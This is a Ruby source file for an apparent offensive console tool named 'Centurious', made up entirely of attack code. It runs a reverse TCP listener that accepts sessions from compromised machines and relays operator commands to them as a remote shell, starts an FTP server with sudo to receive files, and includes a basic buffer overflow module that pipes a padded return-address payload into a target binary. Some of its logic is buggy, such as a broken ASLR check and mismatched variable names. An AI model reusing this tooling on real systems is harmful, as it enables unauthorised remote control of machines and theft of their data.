class Tools
	require 'ostruct'
	require 'socket'
	require 'open3'

	#-----------[instances]-----------
	@@design = Design::Design.new
	#---------------------------------

	#-----------[data backdoor]-----------
	@@host = nil
	@@port = nil
	@@ftphost = nil
	@@ftport = 21
	@@ftpuser = nil
	@@ftppass = nil
	@@ftppath = nil
	#-------------------------------------

	#-----------[data buffer overflow basic]-------------
	@@path = nil
	@@buffer = nil
	@@function_name = nil
	@@cat = false
	@@shellcode = nil
	#----------------------------------------------------

	def main

		while true
			trap("INT", "SIG_IGN")
			list = [
			'use', 'vulnerability/buffer_overflow_basic',
			'exploit/reverse_tcp', 'clear'
			].sort

			comp = proc { |s| list.grep(/^#{Regexp.escape(s)}/) }

			Readline.completion_append_character = ""
			Readline.completion_proc = comp

			input = Readline.readline('CuS~> ', true)

			case input
			when "use exploit->reverse_tcp"
				self.exploitReverseTCP()
				break
			when "use vulnerability->buffer_overflow_basic"
				self.BufferOverflowBasic()
				break
			when "clear"
				system("clear")
			when "quit"
				exit
			when "exit"
				exit
			when "cls"
				system("clear")
			else
				@@design.error {puts "[!] #{input} >> Unknow command"}
			end


		end


	end

	def BufferOverflowBasic
		while true
			#showinfos
			#set path pathfile
			#set buffer <buffer>
			#set function <function_name>
			#set cat <true or false>
			#CuS-><#{"vulnerability->buffer_overflow_basic".yellow}>
			trap("INT", "SIG_IGN")

			list = [
			'set', 'path',
			'buffer', 'clear', 'function', 'cat', 'showinfos', 'exploit'
			].sort

			comp = proc { |s| list.grep(/^#{Regexp.escape(s)}/) }

			Readline.completion_append_character = ""
			Readline.completion_proc = comp

			input = Readline.readline("CuS-><#{"vulnerability->buffer_overflow_basic".yellow}> ", true)
			input_splited = input.split(' ')
			case input_splited.length
			when 1
				case input_splited[0]
				when "clear"
					system("clear")
				when "quit"
					exit
				when "exploit"
					case
					when @@path != nil && @@buffer != nil && @@function_name != nil && @@cat != nil
						self.exploitationBufferOverflow
					else
						@@design.error {puts "You must add options to exploit"}
					end
				when "showinfos"
					@@design.BufferShowInfos(@@path, @@buffer, @@function_name, @@cat)
				else
					@@design.error {puts "#{input} >> Unknow command"}
				end
			when 3
				case
				when input_splited[0] == "set" && input_splited[1] == "path" && input_splited[2] != nil
					@@path = input_splited[2]
					@@design.inf {puts "#{input_splited[2]} >> added"}
				when input_splited[0] == "set" && input_splited[1] == "buffer" && input_splited[2] != nil
					@@buffer = input_splited[2]
					@@design.inf {puts "#{input_splited[2]} >> added"}
				when input_splited[0] == "set" && input_splited[1] == "function" && input_splited[2] != nil
					@@function_name = input_splited[2]
					@@design.inf {puts "#{input_splited[2]} >> added"}
				when input_splited[0] == "set" && input_splited[1] == "cat" && input_splited[2] != nil
					@@cat = input_splited[2]
					@@design.inf {puts "#{input_splited[2]} >> added"}
				else
					@@design.error {puts "#{input} >> Unknow command"}
				end
			else
				@@design.error {puts "#{input} >> Unknow command"}
			end
		end
	end

	def aslr?
		cmd = `cat /proc/sys/kernel/randomize_va_space`
		if cmd != 0
			return true
		else
			return false
		end
	end

	def searchAddr
		addr_function = `objdump -d #{@@path} | grep #{@@function_name}`
		addr = addr_function.split(' ')
		return addr[0]
	end

	def to_shellCode(s)
		s_cut_x = s.split('x')
		array_hexa_number = s_cut_x[1].split('')
		two_by_two = array_hexa_number.each_slice(2).to_a
		joined_element_by_two = two_by_two.map { |e| e.join('')  }
		add_shell_code = joined_element_by_two.map { |e| "\\x#{e.upcase}"}
		return add_shell_code.join('')
	end

	def exploitBufferBasic
		case @@cat
		when true
			system("cat <(python -c \"print 'A'*#{@@buffer} + '#{@@shellcode}'\") - | ./#{@path}")
		when false
			cmd = `python -c "print 'A'*#{@@buffer} + '#{@@shellcode}'" | ./#{@@path}`
			puts cmd
		end
	end

	def exploitationBufferOverflow
		aslr = nil
		puts "[*] Analysing ASLR ~"
		sleep(2)
		case
		when aslr? == true
			aslr = "Activate".red
		else
			aslr = "Not ASLR".green
		end
		puts "[!] ASLR => #{aslr}"
		puts "[*] Search address ~"
		sleep(2)
		puts "[O] Addr => #{self.searchAddr}".green
		puts "[*] Convert #{self.searchAddr}:hexadecimal to shellcode ~"
		sleep(2)
		puts "[Y] ShellCode => #{self.to_shellCode("0x#{self.searchAddr}")}"
		@@shellcode = self.to_shellCode("0x#{self.searchAddr}")
		puts "[*] Exploitation ~"
		sleep(3)
		self.exploitBufferBasic


	end

	def exploitReverseTCP
		while true
			#CuS-><#{"exploit->reverse_tcp".yellow}>
			trap("INT", "SIG_IGN")
			list = [
			'set', 'lhost',
			'lport', 'clear', 'ftpuser', 'ftppass', 'ftppath', 'exploit', 'showinfos'
			].sort

			comp = proc { |s| list.grep(/^#{Regexp.escape(s)}/) }

			Readline.completion_append_character = ""
			Readline.completion_proc = comp

			input = Readline.readline("CuS-><#{"exploit->reverse_tcp".yellow}> ", true)
			input_split = input.split(' ')
			case input_split.length
			when 1
				case input_split[0]
				when "clear"
					system("clear")
				when "quit"
					exit
				when "showinfos"
					@@design.infoLog(@@host, @@port, @@ftphost, @@ftport, @@ftpuser, @@ftppass, @@ftppath)
				when "exploit"
					case
					when @@host != nil && @@port != nil && @@ftphost != nil && @@ftppass != nil && @@ftpuser != nil && @@ftppath != nil
						self.listner
						break
					else
						@@design.error {puts "You must add host and port \nto start listner"}
					end
				else
					@@design.error {puts "#{input} >> unknow command"}
				end
			when 3
				case
				when input_split[0] == "set" && input_split[1] == "lhost" && input_split[2] != nil
					@@host = input_split[2]
					@@ftphost = input_split[2]
					@@design.inf {puts "#{@@host} >> added"}
				when input_split[0] == "set" && input_split[1] == "lport" && input_split[2] != nil
					@@port = input_split[2]
					@@design.inf {puts "#{@@port} >> added"}
				when input_split[0] == "set" && input_split[1] == "ftpuser" && input_split[2] != nil
					@@ftpuser = input_split[2]
					@@design.inf {puts "#{@@ftpuser} >> added"}
				when input_split[0] == "set" && input_split[1] == "ftppass" && input_split[2] != nil
					@@ftppass = input_split[2]
					@@design.inf {puts "#{@@ftppass} >> added"}
				when input_split[0] == "set" && input_split[1] == "ftppath" && input_split[2] != nil
					@@ftppath = input_split[2]
					@@design.inf {puts "#{@@ftppath} >> added"}
				else
					@@design.error {puts "#{input} >> unknow Command"}
				end
			else
				@@design.error {puts "#{input} >> unknow command"}
			end

		end
	end

	def listner
		s = TCPServer.open @@port
		system("sudo python modules/ftp_server.py #{@@ftphost} #{@@ftport} #{@@ftpuser} #{@@ftppass} #{@@ftppath} > /dev/null 2>&1 &")
		puts @@design.connectFTP(@@ftphost, @@ftport)
		puts @@design.inListen(@@host, @@port)
		while true
			@session = s.accept
			sock_domain, remote_port, remote_hostname, remote_ip = @session.peeraddr
			puts @@design.sessionCreate(remote_ip, remote_port)
			self.Commands
			break

		end

	end

	def shell_get
		while(true)
			begin
				input = @@design.input("$".green)
				input_splited = input.split(' ')
				case input_splited.length

				when 0
					next

				when 1
					@session.puts input_splited
					case input_splited[0]

					when "clear"
						system("clear")

					when "exit"
						@session.puts input
						break

					when "cls"
						system("clear")
					end

				else
					@session.puts input
				end
				data = @session.recv(65556)
				puts data
			end
		end
		rescue SignalException
			puts "[*] CTRL+C For Quit type 'exit' or 'quit' "
		end

				#if input.start_with? "exit"
					#@session.puts input
					#break
				#else
					#@session.puts input
				#end
				#data = @session.recv(65556)
				#puts data

	def Commands
		#@@design.help()
		begin
			while input = @@design.input("Centurious@Shell$ ".red)
				input_splited = input.split(' ')
				case input_splited.length

				when 0
					next

				when 1
					@session.puts input_splited
					case input_splited[0]
					when "clear"
						system("clear")

					when "help"
						@@design.help()

					when "shell"
						#inter shell
						begin
							shell_get
						rescue SignalException
							puts "Press CTRL+C For Quit Shell!"
						end

					when "quit"
						system('pkill python')
						exit

					when "ls"
						sleep(0.2)

					when "dir"
						sleep(0.2)

					when "exit"
						system('pkill python')
						exit
					end

				when 2
					@session.puts input_splited.join(' ')
				when 3
					@session.puts input_splited.join(' ')
				when 4
					@session.puts input_splited.join(' ')
				when 5
					@session.puts input_splited.join(' ')
				when 6
					@session.puts input_splited.join(' ')
				when 7
					@session.puts input_splited.join(' ')
				when 8
					@session.puts input_splited.join(' ')
				when 9
					@session.puts input_splited.join(' ')
				when 10
					@session.puts input_splited.join(' ')
				else
					@@design.error {puts "#{input} >> unknow command"}
					next
				end
				data = @session.recv(65556)
				puts data
			end
		rescue SignalException
			puts "[*] CTRL+C For Quit type 'exit' or 'quit' "
		end
	end
end
